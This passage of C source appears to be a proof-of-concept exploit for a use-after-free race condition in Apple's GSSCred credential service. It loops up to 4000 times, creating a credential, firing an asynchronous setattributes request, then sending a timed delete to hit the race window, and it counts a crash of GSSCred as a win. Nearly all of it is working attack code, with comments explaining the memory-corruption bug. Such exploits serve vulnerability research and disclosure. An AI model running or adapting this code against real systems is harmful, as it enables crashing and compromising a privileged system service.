	// First send a delete message to make sure GSSCred is up and running, then give it time to
	// initialize.
	gsscred_race_delete_credential_sync(&state);
	sleep(1);

	// Loop until we win.
	const size_t MAX_TRIES = 4000;
	for (size_t try = 1;; try++) {

		// Create the credential synchronously.
		bool ok = gsscred_race_create_credential_sync(&state);
		if (!ok) {
			ERROR("Could not create the credential");
			break;
		}

		// Wait a little while after creating the credential for GSSCred's allocator to
		// calm down. Probably not necessary, but better safe than sorry.
		usleep(POST_CREATE_CREDENTIAL_DELAY);

		// Send the setattributes request asynchronously. do_SetAttrs() will store a
		// pointer to the target credential on the stack and then loop continuously
		// allocating memory. The reuse of this pointer later in the function is the UAF,
		// and our race window is however long do_SetAttrs() spends in the allocation loop.
		gsscred_race_setattributes_async(&state);

		// Sleep for awhile, until there's a good chance that the delete request will
		// arrive in the middle of the race window.
		usleep(SETATTRIBUTES_TO_DELETE_DELAY);

		// Send the delete message synchronously.
		gsscred_race_delete_credential_sync(&state);

		// Wait for the setattributes request to finish.
		gsscred_race_synchronize(&state);

		// If we got a Connection Interrupted error, then we crashed GSSCred.
		if (state.connection_interrupted) {
			DEBUG_TRACE("Crash!");
			DEBUG_TRACE("Won the race after %zu %s", try,
					(try == 1 ? "try" : "tries"));
			success = true;
			break;
		}

		DEBUG_TRACE_LEVEL(2, "Lost the race, trying again...");
		// If we've run out of tries, give up.
		if (try >= MAX_TRIES) {
			ERROR("Could not win the race after %zu tries", try);
			break;
		}

		// If we didn't get a Connection Interrupted error, then GSSCred is still running.
		// Sleep for awhile to let GSSCred settle down, then try again.
		usleep(RETRY_RACE_DELAY);
	}

	// Clean up all state.
	gsscred_race_deinit(&state);

	return success;
}

// ---- Public API --------------------------------------------------------------------------------

bool gsscred_race() {
	DEBUG_TRACE("gsscred_race");
	return gsscred_race_run();
}
